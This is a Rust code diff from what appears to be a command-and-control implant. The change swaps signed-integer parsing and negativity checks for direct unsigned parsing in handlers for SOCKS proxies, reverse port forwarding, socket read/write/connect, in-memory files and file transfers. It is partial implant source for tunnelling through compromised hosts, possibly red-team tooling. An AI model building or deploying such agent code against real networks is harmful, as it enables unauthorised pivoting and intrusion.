@@ -30,8 +30,7 @@ pub(super) fn execute_network(
     state: &mut PhantomState,
 ) -> Result<(), PhantomError> {
     let mut parser = TaskParser::new(payload);
-    let subcommand = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative network subcommand"))?;
+    let subcommand = parser.uint32()?;
     let subcommand = DemonNetCommand::try_from(subcommand)?;
 
     match subcommand {
@@ -124,8 +123,7 @@ pub(super) async fn execute_socket(
     state: &mut PhantomState,
 ) -> Result<(), PhantomError> {
     let mut parser = TaskParser::new(payload);
-    let subcommand = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative socket subcommand"))?;
+    let subcommand = parser.uint32()?;
     let subcommand = DemonSocketCommand::try_from(subcommand)?;
 
     match subcommand {
@@ -189,8 +187,7 @@ pub(super) async fn execute_socket(
             });
         }
         DemonSocketCommand::ReversePortForwardRemove => {
-            let socket_id = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative reverse port-forward socket id"))?;
+            let socket_id = parser.uint32()?;
             if state.reverse_port_forwards.contains_key(&socket_id) {
                 let callbacks_before = state.pending_callbacks.len();
                 state.remove_reverse_port_forward(socket_id);
@@ -202,10 +199,8 @@ pub(super) async fn execute_socket(
             }
         }
         DemonSocketCommand::SocksProxyAdd => {
-            let bind_addr = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative socks proxy bind address"))?;
-            let bind_port = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative socks proxy bind port"))?;
+            let bind_addr = parser.uint32()?;
+            let bind_port = parser.uint32()?;
             let listener_id = state.allocate_socket_id();
             let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);
             match TcpListener::bind(bind_socket) {
@@ -244,8 +239,7 @@ pub(super) async fn execute_socket(
             state.queue_callback(PendingCallback::Socket { request_id, payload });
         }
         DemonSocketCommand::SocksProxyRemove => {
-            let socket_id = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative socks proxy socket id"))?;
+            let socket_id = parser.uint32()?;
             if state.socks_proxies.remove(&socket_id).is_some() {
                 let client_ids = state
                     .socks_clients
@@ -278,10 +272,8 @@ pub(super) async fn execute_socket(
             });
         }
         DemonSocketCommand::Read => {
-            let socket_id = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
-            let socket_type = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative socket type"))?;
+            let socket_id = parser.uint32()?;
+            let socket_type = parser.uint32()?;
             let socket_type = DemonSocketType::try_from(socket_type)?;
             let success = parser.bool32()?;
 
@@ -289,8 +281,7 @@ pub(super) async fn execute_socket(
                 let data = parser.bytes()?;
                 write_to_socket(request_id, state, socket_id, socket_type, data)?;
             } else {
-                let error_code = u32::try_from(parser.int32()?)
-                    .map_err(|_| PhantomError::TaskParse("negative socket error code"))?;
+                let error_code = parser.uint32()?;
                 state.queue_callback(PendingCallback::Error {
                     request_id,
                     text: format!("socket {socket_id:#x} read failed with error {error_code}"),
@@ -298,8 +289,7 @@ pub(super) async fn execute_socket(
             }
         }
         DemonSocketCommand::Write => {
-            let socket_id = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
+            let socket_id = parser.uint32()?;
             let data = parser.bytes()?;
             let mut write_failure = None;
             if let Some(socket) = state.sockets.get_mut(&socket_id) {
@@ -320,13 +310,11 @@ pub(super) async fn execute_socket(
             }
         }
         DemonSocketCommand::Close => {
-            let socket_id = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
+            let socket_id = parser.uint32()?;
             state.remove_socket(socket_id);
         }
         DemonSocketCommand::Connect => {
-            let socket_id = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
+            let socket_id = parser.uint32()?;
             let atyp = parser.byte()?;
             let host = parser.bytes()?;
             let port = u16::from_ne_bytes(parser.int16()?.to_ne_bytes());
@@ -370,8 +358,7 @@ pub(super) fn execute_memfile(
     state: &mut PhantomState,
 ) -> Result<(), PhantomError> {
     let mut parser = TaskParser::new(payload);
-    let mem_file_id = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative memfile id"))?;
+    let mem_file_id = parser.uint32()?;
     let total_size = usize::try_from(parser.int64()?)
         .map_err(|_| PhantomError::TaskParse("negative memfile size"))?;
     let chunk = parser.bytes()?;
@@ -403,8 +390,7 @@ pub(super) fn execute_transfer(
     state: &mut PhantomState,
 ) -> Result<(), PhantomError> {
     let mut parser = TaskParser::new(payload);
-    let subcommand = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative transfer subcommand"))?;
+    let subcommand = parser.uint32()?;
     let subcommand = DemonTransferCommand::try_from(subcommand)?;
 
     match subcommand {
@@ -517,14 +503,10 @@ fn write_to_socket(
 fn parse_reverse_port_forward_target(
     parser: &mut TaskParser<'_>,
 ) -> Result<(u32, u32, u32, u32), PhantomError> {
-    let bind_addr = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward bind address"))?;
-    let bind_port = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward bind port"))?;
-    let forward_addr = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward forward address"))?;
-    let forward_port = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward forward port"))?;
+    let bind_addr = parser.uint32()?;
+    let bind_port = parser.uint32()?;
+    let forward_addr = parser.uint32()?;
+    let forward_port = parser.uint32()?;
     Ok((bind_addr, bind_port, forward_addr, forward_port))
 }
 
